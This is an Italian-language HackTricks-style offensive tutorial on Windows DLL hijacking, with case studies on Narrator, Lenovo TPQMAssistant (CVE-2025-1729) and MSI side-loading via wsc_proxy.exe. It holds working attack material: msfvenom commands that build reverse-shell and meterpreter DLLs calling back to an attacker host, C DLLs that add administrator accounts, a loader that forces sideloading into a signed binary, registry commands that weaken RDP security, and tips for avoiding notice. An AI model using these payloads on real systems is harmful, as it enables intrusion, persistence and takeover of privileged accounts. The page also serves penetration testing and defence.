# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione affidabile affinché carichi una DLL malevola. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per l'esecuzione di codice, per ottenere persistenza e, meno frequentemente, per privilege escalation. Nonostante qui l'attenzione sia sull'escalation, il metodo di hijacking rimane lo stesso a prescindere dall'obiettivo.

### Tecniche comuni

Diversi metodi vengono impiegati per il DLL hijacking, ciascuno con la propria efficacia a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Scambiare una DLL genuina con una malevola, eventualmente utilizzando DLL Proxying per preservare la funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: Posizionare la DLL malevola in un percorso di ricerca che venga valutato prima di quello della DLL legittima, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che l'applicazione carichi, credendo che si tratti di una DLL richiesta ma non esistente.
4. **DLL Redirection**: Modificare i parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per reindirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una malevola nella directory WinSxS, metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, similmente alle tecniche di Binary Proxy Execution.

## Finding missing Dlls

Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals e **impostare** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solo l'**attività del file system**:

![](<../../../images/image (153).png>)

Se stai cercando **missing dlls in general** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **missing dll inside an specific executable** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguire l'eseguibile e fermare la cattura degli eventi**.

## Exploiting Missing Dlls

Per ottenere l'elevazione dei privilegi, la nostra migliore possibilità è poter **scrivere una dll che un processo privilegiato tenterà di caricare** in uno dei **percorsi in cui verrà cercata**. Pertanto, potremo **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella contenente la **dll originale** (caso particolare), oppure potremo **scrivere in una cartella dove la dll verrà cercata** e la dll originale **non esiste** in nessuna cartella.

### Dll Search Order

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come le Dll vengono caricate nello specifico.**

Le applicazioni Windows cercano le DLL seguendo un insieme di **percorsi di ricerca predefiniti**, rispettando una sequenza particolare. Il problema del DLL hijacking sorge quando una DLL malevola viene posizionata strategicamente in una di queste directory in modo che venga caricata prima della DLL autentica. Una soluzione per prevenire questo è assicurarsi che l'applicazione usi percorsi assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere l'**ordine di ricerca delle DLL su sistemi a 32-bit** qui sotto:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'**ordine di ricerca predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente viene promossa al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll potrebbe essere richiesta specificando il percorso assoluto invece che solo il nome**. In quel caso la dll verrà **cercata soltanto in quel percorso** (se la dll ha dipendenze, queste verranno cercate come caricate semplicemente per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata per nome (nessun percorso assoluto e non usando i flag di caricamento sicuro) può essere costretto a caricare una DLL malevola da quella directory.

Idea chiave
- Costruire i parametri del processo con RtlCreateProcessParametersEx e fornire un DllPath personalizzato che punti alla tua cartella controllata (ad es., la directory in cui risiede il tuo dropper/unpacker).
- Creare il processo con RtlCreateUserProcess. Quando il binario target risolverà una DLL per nome, il loader consulterà il DllPath fornito durante la risoluzione, permettendo il sideloading affidabile anche quando la DLL malevola non è colocata insieme all'EXE target.

Note/limitazioni
- Questo influenza il processo figlio che viene creato; è diverso da SetDllDirectory, che influenza solo il processo corrente.
- Il target deve importare o chiamare LoadLibrary su una DLL per nome (nessun percorso assoluto e non usando LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e percorsi assoluti hardcoded non possono essere hijackati. Forwarded exports e SxS possono cambiare la precedenza.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Esempio completo in C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Posiziona un xmllite.dll malevolo (che esporta le funzioni richieste o fa da proxy per quello reale) nella tua directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll per nome usando la tecnica sopra. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per guidare catene di sideloading multi-stage: un launcher iniziale drops una helper DLL, che poi spawna un binario Microsoft-signed, hijackable, con un DllPath personalizzato per forzare il caricamento della DLL dell’attaccante da una staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for reindirizzamento and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalation dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi differenti** (horizontal or lateral movement), che è **privo di una DLL**.
- Assicurarsi che sia disponibile **write access** per qualsiasi **directory** in cui la **DLL** verrà **ricercata**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del system path.

Sì, i requisiti sono complicati da trovare poiché **di default è piuttosto difficile trovare un eseguibile privilegiato privo di una DLL** ed è ancora **più strano avere permessi di scrittura su una cartella del system path** (normalmente non è possibile). Ma, in ambienti mal configurati questo è possibile.\
Nel caso tu sia fortunato e soddisfi i requisiti, puoi consultare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se lo **scopo principale del progetto è bypass UAC**, potresti trovare lì una **PoC** of a Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando solo il percorso della cartella in cui hai write permissions).

Nota che puoi **controllare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli imports di un eseguibile e gli exports di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare Dll Hijacking per ottenere privilegi elevati** avendo permessi di scrittura in una **System Path folder** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatici

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificherà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Esempio

Se trovi uno scenario sfruttabile, una delle cose più importanti per riuscire nell'exploit è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Tieni comunque presente che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da [**High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio su dll hijacking focalizzato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dll**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporre** e **comportarsi** come previsto, **inoltrando tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxify e **generare una proxified dll** o **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86 non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che, in diversi casi, la Dll che compili deve **export several functions** che verranno caricate dal processo vittima; se queste funzioni non esistono il **binary won't be able to load** queste ultime e l'**exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione di un utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con punto di ingresso del thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a interrogare una DLL di localizzazione prevedibile e specifica per lingua all'avvio che può essere hijacked per arbitrary code execution e persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Un hijack ingenuo parlerà/evidenzierà l'UI. Per restare silenziosi, al attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e `SuspendThread` su di esso; continua nel tuo thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricata la DLL piantata. Sul secure desktop (logon screen), premi CTRL+WIN+ENTER per avviare Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Consentire il classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Effettua RDP verso l'host; alla schermata di accesso premi CTRL+WIN+ENTER per lanciare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.
- L'esecuzione si interrompe quando la sessione RDP si chiude—inject/migrate prontamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un built-in Accessibility Tool (AT) (es. CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla, quindi impostare `configuration` su quel nome AT. Questo permette l'esecuzione arbitraria tramite il framework Accessibility.

Notes
- Scrivere sotto `%windir%\System32` e modificare valori HKLM richiede privilegi amministrativi.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** in TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Un attaccante può posizionare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso d'attacco

1. Come utente standard, posizionare `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendere che l'attività pianificata venga eseguita alle 9:30 sotto il contesto dell'utente corrente.
3. Se un amministratore è connesso quando l'attività viene eseguita, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Concatenare tecniche standard di UAC bypass per elevare da integrità media a privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli threat actors frequentemente abbinano dropper basati su MSI con DLL side-loading per eseguire payload sotto un processo firmato e attendibile.

Chain overview
- L'utente scarica l'MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (es. LaunchApplication o un'azione VBScript), ricostruendo la fase successiva da risorse embedded.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (esempio: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quando l'EXE firmato viene avviato, Windows DLL search order carica wsc.dll dalla working directory per prima, eseguendo codice dell'attaccante sotto un parent firmato (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabella CustomAction:
- Cercare voci che eseguono eseguibili o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue un file embedded in background.
- In Orca (Microsoft Orca.exe), ispezionare le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/suddivisi nel CAB dell'MSI:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usare lessmsi: lessmsi x package.msi C:\out
- Cercare più piccoli frammenti che vengono concatenati e decrittati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratico con wsc_proxy.exe
- Posiziona questi due file nella stessa cartella:
- wsc_proxy.exe: host firmato legittimo (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: attacker DLL. Se non sono richiesti exports specifici, DllMain può essere sufficiente; altrimenti, costruisci una proxy DLL e inoltra gli exports richiesti alla genuine library mentre esegui il payload in DllMain.
- Costruisci un payload DLL minimale:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di esportazione, usa un framework di proxying (es., DLLirant/Spartacus) per generare una forwarding DLL che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome DLL da parte dell'host binary. Se l'host usa percorsi assoluti o safe loading flags (es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), il hijack potrebbe fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedenza e devono essere considerati nella selezione dell'host binary e dell'export set.

## Riferimenti

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
